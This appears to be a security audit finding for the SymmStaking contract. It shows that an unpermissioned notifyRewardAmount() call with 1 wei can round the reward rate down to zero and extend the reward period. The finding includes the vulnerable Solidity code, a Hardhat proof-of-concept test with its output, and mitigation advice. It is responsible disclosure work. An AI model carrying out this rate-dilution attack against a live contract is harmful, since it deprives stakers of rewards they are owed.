# Reward rate can be diluted by attacker

## Description
The current flow allows anyone to call `notifyRewardAmount()` --> `_addRewardsForToken()` which [decreases](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L374) the `state.rate` and [increases](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L378) `state.periodFinish`. This dilutes rewards:
```solidity
	function _addRewardsForToken(address token, uint256 amount) internal {
		TokenRewardState storage state = rewardState[token];

		if (block.timestamp >= state.periodFinish) {
			state.rate = amount / state.duration;
		} else {
			uint256 remaining = state.periodFinish - block.timestamp;
			uint256 leftover = remaining * state.rate;
@--->      	state.rate = (amount + leftover) / state.duration;
		}

		state.lastUpdated = block.timestamp;
@--->	state.periodFinish = block.timestamp + state.duration;
	}
```

An attack vector would be:
1. Assume current `state.rate` to be `1` like it is in [existing test](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/tests/symmStaking.behavior.ts#L96) `"should calculate reward correctly after single user deposit"`. The period duration is `1 week`. Reward amount is `604800` which `24 * 7 * 60 * 60`.
2. After some duration has passed say, half a week, attacker calls `notifyRewardAmount()` with some reward token amount as `1 wei`
3. Since half of the period duration has passed, `_addRewardsForToken()` calculates `state.rate = (amount + leftover) / state.duration = (1 + 604800/2) / 1 week` which rounds down to `0`.
4. The remaining reward is not paid now since rate has been reduced to `0`. While this is an extreme case, in other cases too the rate will get diluted. And of course the period duration keeps on getting extended with each reward addition.

## Impact
1. **Reward Rate Dilution**: Each time new rewards are added to an ongoing period, the reward rate gets reduced, providing stakers with lower rewards than expected within a defined time duration. Such delays in receiving rewards are akin to loss of funds (loss of investment opportunity due to time delays).
2. **Economic Misalignment**: The distribution pattern does not align with typical staking expectations, where reward rates should remain consistent within a single reward period.
3. **Perpetual Extension**: If rewards are added regularly, the reward period could be extended indefinitely, preventing it from ever ending.

Note that even if an attacker is not involved, normal course of operations by the admin causes this issue. See `Root Cause & Mitigation` section below for a fix recommendation.

## Proof of Concept
Add this inside `token/tests/symmStaking.behavior.ts` under the `describe("Reward Calculation"` block and run to see the following output:
```js
		it("shows bug - how reward rate can be manipulated with small amounts", async function () {
			const depositAmount = "604800"
			const initialRewardAmount = depositAmount
			
			// Setup reward token
			await stakingToken.connect(admin).approve(await symmStaking.getAddress(), initialRewardAmount)
			await symmStaking.connect(admin).configureRewardToken(await stakingToken.getAddress(), true)
			await symmStaking.connect(admin).notifyRewardAmount([await stakingToken.getAddress()], [initialRewardAmount])
			
			// Get initial reward rate
			const initialState = await symmStaking.rewardState(await stakingToken.getAddress())
			const initialRate = initialState.rate
			const initialPeriodFinish = initialState.periodFinish
			console.log("\nInitial reward rate:", initialRate.toString())
			
			// User deposits tokens
			await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount)
			await symmStaking.connect(user1).deposit(depositAmount, user1.address)
		  
			// Wait some time to accumulate rewards
			await time.increase(Number(initialState.duration) / 2)
		  
			// Now simulate an attack with minimal reward amount to dilute the rate. --> user2 = attacker
			const attackAmount = "1" // Just 1 wei
			await stakingToken.connect(user2).approve(await symmStaking.getAddress(), attackAmount)
			await symmStaking.connect(user2).notifyRewardAmount([await stakingToken.getAddress()], [attackAmount])
		  
			// Check how rate was manipulated
			const attackedState = await symmStaking.rewardState(await stakingToken.getAddress())
			const attackedRate = attackedState.rate
			const attackedPeriodFinish = attackedState.periodFinish
			console.log("\nAttacked reward rate:", attackedRate.toString())
		  
			// Verify the impact of the attack
			expect(attackedPeriodFinish).to.be.gt(initialPeriodFinish) // Period has been extended
			expect(attackedRate).to.be.lt(initialRate) // Rate has been reduced
			expect(attackedRate).to.eq(0) // Rate has been reduced
		})
```

Output:
```js

Initial reward rate: 1

Attacked reward rate: 0
          âœ” shows bug - how reward rate can be manipulated with small amounts

```

## Root Cause & Mitigation 
The fundamental problem is that the current design doesn't properly separate different "tranches" of rewards. When new rewards are added, they're combined with existing rewards in a way that disrupts the original distribution plan. A truly fair system would need to:
- Keep track of separate reward schedules for each reward addition.
- Distribute each reward schedule according to its own timeline & rate.
- Although not strictly required, the protocol can even choose to make `notifyRewardAmount()` permissioned and only callable by admin as a measure of additional security.
